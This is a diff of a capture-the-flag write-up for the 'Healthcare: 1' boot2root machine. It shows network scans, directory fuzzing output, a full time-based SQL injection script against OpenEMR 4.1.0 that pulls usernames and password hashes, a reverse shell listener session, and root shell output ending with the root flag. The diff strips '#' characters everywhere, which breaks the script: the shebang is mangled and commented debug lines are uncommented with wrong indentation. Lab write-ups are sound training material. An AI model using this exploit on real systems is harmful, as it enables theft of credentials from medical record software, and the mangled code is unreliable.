@@ -1,4 +1,4 @@
-# Healthcare: 1 Writeup
+  Healthcare: 1 Writeup
 
 Description:
 \
@@ -8,7 +8,7 @@ Description:This machine was developed to train the student to think according t
 
 It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and root.txt.
 
-# Exploitation
+  Exploitation
 Let's start with network scan
 ```bash
 Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
@@ -70,7 +70,7 @@ ________________________________________________
 
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 1ms]
 index                   [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 5ms]
-# on at least 1 host    [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 6ms]
+  on at least 1 host    [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 6ms]
 images                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
 
 css                     [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
@@ -78,15 +78,15 @@ js                      [Status: 403, Size: 1013, Words: 102, Lines: 43, Duratio
 vendor                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
 robots                  [Status: 200, Size: 620, Words: 60, Lines: 20, Duration: 0ms]
 favicon                 [Status: 200, Size: 1406, Words: 3, Lines: 2, Duration: 47ms]
-#                       [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 543ms]
-# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 554ms]
-#                       [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 588ms]
-#                       [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 592ms]
-# Copyright 2007 James Fisher [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 594ms]
-# directory-list-2.3-big.txt [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 596ms]
-# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 604ms]
+                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 543ms]
+  Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 554ms]
+                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 588ms]
+                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 592ms]
+  Copyright 2007 James Fisher [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 594ms]
+  directory-list-2.3-big.txt [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 596ms]
+  Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 604ms]
                         [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 620ms]
-# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 636ms]
+  or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 636ms]
 fonts                   [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 57ms]
 gitweb                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
                         [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 0ms]
@@ -115,15 +115,15 @@ Shellcodes: No Results
 \
 So , there is an time based sql injection vulnerability here , and this is poc 
 ```bash
-# Exploit Title: OpenEMR 4.1.0 - 'u' SQL Injection
-# Date: 2021-04-03
-# Exploit Author: Michael Ikua
-# Vendor Homepage: https://www.open-emr.org/
-# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
-# Version: 4.1.0
-# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/
+  Exploit Title: OpenEMR 4.1.0 - 'u' SQL Injection
+  Date: 2021-04-03
+  Exploit Author: Michael Ikua
+  Vendor Homepage: https://www.open-emr.org/
+  Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
+  Version: 4.1.0
+  Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/
 
-#!/usr/bin/env python3
+ !/usr/bin/env python3
 
 import requests
 import string
@@ -144,7 +144,7 @@ print("""
 """)
 
 all = string.printable
-# edit url to point to your openemr instance
+  edit url to point to your openemr instance
 url = "http://192.168.56.106/openemr/interface/login/validateUser.php?u=" 
 
 def extract_users_num():
@@ -164,18 +164,18 @@ def extract_users():
     output = []
     for n in range(1,1000):
         payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
-        #print(payload)
+         print(payload)
         r = requests.get(url+payload)
-        #print(r.request.url)
+         print(r.request.url)
         if r.elapsed.total_seconds() > 3:
             length = n
             break
     for i in range(1,length+1):
         for char in all:
             payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
-            #print(payload)
+             print(payload)
             r = requests.get(url+payload)
-            #print(r.request.url)
+             print(r.request.url)
             if r.elapsed.total_seconds() > 3:
                 output.append(char)
                 if char == ",":
@@ -445,10 +445,10 @@ penelope -p 4445
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/localhost.localdomain~192.168.0.107-Linux-i686/2026_02_04-14_15_35-801.log 📜
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-[root@localhost tmp]# id                                                                                                                                                                                      
+[root@localhost tmp]  id                                                                                                                                                                                      
 uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
-[root@localhost tmp]# cd /root
-[root@localhost root]# ls -la
+[root@localhost tmp]  cd /root
+[root@localhost root]  ls -la
 total 920
 drwxr-x--- 20 root root   4096 Jul 29  2020 ./
 drwxr-xr-x 21 root root   4096 Feb  4 09:48 ../
@@ -483,7 +483,7 @@ drwx------  2 root root   4096 Sep  6  2011 drakx/
 -rw-rw-rw-  1 root root   2096 Jul 29  2020 root.txt
 -rw-r--r--  1 root root 815966 Apr 12  2020 sudo.rpm
 drwx------  2 root root   4096 Feb  4 09:48 tmp/
-[root@localhost root]# cat root.txt 
+[root@localhost root]  cat root.txt 
 ██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
  ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
   ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
@@ -498,7 +498,7 @@ Follow me at: http://v1n1v131r4.com
 
 root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
  
-[root@localhost root]# 
+[root@localhost root]  
 ```
 \
 The end , Thank you for reading till here
